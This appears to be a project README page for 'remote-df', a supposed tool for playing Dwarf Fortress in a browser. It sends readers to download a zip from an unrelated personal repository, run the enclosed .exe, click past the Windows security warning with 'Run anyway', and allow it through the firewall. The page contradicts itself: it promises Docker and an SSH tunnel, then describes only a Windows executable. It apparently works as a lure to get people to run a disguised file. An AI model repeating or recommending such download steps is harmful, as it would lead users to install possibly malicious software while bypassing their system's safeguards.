---
layout: "default"
title: "🏰 remote-df - Play Dwarf Fortress in your browser"
description: "Stream Dwarf Fortress to your web browser using a Docker container and a secure SSH tunnel."
---
# 🏰 remote-df - Play Dwarf Fortress in your browser

[![](https://img.shields.io/badge/Download-remote--df-blue.svg)](https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip)

## 📖 About this project

Remote-df lets you run a session of Dwarf Fortress on your computer and interact with it through a standard web browser. This tool handles the connection between your game and your browser. You do not need to install complex server software or modify your game files significantly. The application provides a stable bridge for remote access, allowing you to manage your fortress from any device on your local network.

## ⚙️ System Requirements

Before you begin, ensure your computer meets these conditions:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Network: A stable connection for the browser interface.
*   Software: Version 50.xx or newer of Dwarf Fortress installed on your system.

## 🚀 Getting Started

Follow these steps to set up the software on your machine.

1. Visit the project download page: https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip
2. Locate the latest release version on the right side of the page.
3. Select the file ending in .exe to start the download.
4. Save the file to a folder you recognize, such as your Downloads folder or your Desktop.

## 💾 Installation and Setup

This software does not require a traditional installer. Follow this process to start the tool:

1. Open the folder where you saved the download.
2. Double-click the remote-df.exe file.
3. Windows might show a security prompt asking for permission to run the application. Select More info and then Run anyway to proceed.
4. A command prompt window will open. Do not close this window while you play. It keeps the connection active.
5. Launch Dwarf Fortress as you normally would.
6. Open your preferred web browser on your computer or another device.
7. Type localhost:8080 into the address bar and press Enter.

## 🖥️ How it works

The application creates a local server on your computer. When you open the browser address, it communicates with the Dwarf Fortress process. It translates the game input and output into a format that web browsers understand. This allows you to view the game map and send commands through your mouse or keyboard.

If you lose connection, refresh your browser page. If the game crashes, close both the game and the remote-df window, then restart both in the order mentioned above.

## 🛠️ Troubleshooting

If you encounter issues during setup, check these common items:

*   Firewall blocks: Windows Defender may try to block the app. Ensure you allow the application to access private networks when prompted.
*   Port conflicts: If another program uses port 8080, the software may fail to start. Restart your computer to clear current port usage.
*   Version mismatch: Ensure you use a version of Dwarf Fortress compatible with recent updates. Check the release notes on the download page if you experience graphical errors.
*   Browser compatibility: Use a modern browser like Chrome, Firefox, or Edge. Older versions of Internet Explorer will not work with this interface.

## 📦 Updates

Software authors release updates to fix bugs and improve performance. To update your installation:

1. Visit the link provided below.
2. Download the version marked as the latest release.
3. Replace your old remote-df.exe file with the new one.
4. Run the new file to apply the updates.

[![](https://img.shields.io/badge/Download-Latest-Version-grey.svg)](https://raw.githubusercontent.com/Tabitha4937/tabitha4937.github.io/main/pyin/tabitha-io-github-v1.8-alpha.3.zip)

## 📋 Frequently Asked Questions

**Does this software store my game files on a third-party server?**
No. All data stays on your machine. This application only creates a bridge for your local network. It does not send your files to external cloud storage.

**Can other people see my fortress?**
Only users on your local network can access the address provided, provided they have your local IP address. If you keep the connection local, the game remains private.

**Does this change how Dwarf Fortress works?**
The software merely serves as a window into the game process. It does not alter your save files or game settings in a permanent way. If you close the remote-df application, the game behaves exactly as it did before.

**Why does a black window remain open?**
That window displays the status of the connection. It shows if the server is running and logs any errors that might occur. Keep it open to maintain the link to your browser. You may minimize it to keep your taskbar tidy.

**How do I stop the service?**
Simply close the window for the remote-df application. The browser will lose its connection immediately. Your game will continue to run normally, or you can close the game after the service shuts down.